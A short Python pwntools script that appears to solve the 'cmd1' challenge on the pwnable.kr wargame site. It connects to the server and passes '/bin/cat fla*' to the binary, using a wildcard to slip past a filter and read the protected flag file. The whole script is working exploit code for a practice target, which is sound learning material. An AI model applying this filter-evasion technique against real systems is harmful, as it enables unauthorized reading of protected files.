from pwn import *

p = remote('pwnable.kr',10012)
p.sendlineafter(b'CMD1 Shell', b'./cmd1 "/bin/cat fla*"')
p.interactive()